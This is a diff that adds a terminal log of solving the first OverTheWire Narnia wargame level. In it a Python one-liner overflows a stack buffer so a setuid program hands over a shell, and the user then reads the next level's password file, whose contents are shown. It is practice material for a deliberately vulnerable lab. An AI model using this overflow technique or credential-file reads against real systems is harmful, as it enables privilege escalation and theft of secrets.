@@ -1,0 +1,27 @@
+narnia0@melinda:/narnia$ python -c "print 'a' * 20 + '\xef\xbe\xad\xde'" | ./narnia0
+Correct val's value from 0x41414141 -> 0xdeadbeef!
+Here is your chance: buf: aaaaaaaaaaaaaaaaaaaaﾭ�
+val: 0xdeadbeef
+narnia0@melinda:/narnia$ whoami
+narnia0
+narnia0@melinda:/narnia$ whoami
+narnia0
+narnia0@melinda:/narnia$ python -c "print 'a' * 20 + '\xef\xbe\xad\xde' ; cat" | ./narnia0
+Correct val's value from 0x41414141 -> 0xdeadbeef!
+Traceback (most recent call last):
+  File "<string>", line 1, in <module>
+Here is your chance: buf: aaaaaaaaaaaaaaaaaaaaﾭ�
+val: 0xdeadbeef
+NameError: name 'cat' is not defined
+narnia0@melinda:/narnia$ (python -c "print 'a' * 20 + '\xef\xbe\xad\xde'" ; cat )| ./narnia0
+Correct val's value from 0x41414141 -> 0xdeadbeef!
+Here is your chance: buf: aaaaaaaaaaaaaaaaaaaaﾭ�
+val: 0xdeadbeef
+whoami
+narnia1
+cat /etc/narnia_pass/narnia1
+efeidiedae
+^C
+narnia0@melinda:/narnia$ exit
+logout
+Connection to narnia.labs.overthewire.org closed.
